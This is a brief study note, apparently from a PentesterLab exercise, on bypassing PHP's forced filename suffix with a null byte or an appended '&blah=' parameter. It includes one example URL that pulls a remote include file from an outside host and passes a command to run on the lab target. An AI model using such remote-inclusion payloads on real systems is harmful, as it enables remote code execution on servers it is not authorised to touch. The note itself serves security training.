# Null Bytes and `&blah=` / `?blah=`

We can bypass PHP forcing a suffix down our throats by using any of these tags after our custom filename.

```ad-warning
This only works up to PHP `5.3.4`
```

Example:

```url
http://ptl-94fb4b8d-48c67394.libcurl.so/?page=https://assets.pentesterlab.com/test_include_system.txt%00&c=/usr/local/bin/score%20e6206710-c2c4-4704-869e-888e9947486e
```

Here we bypass with a nullbyte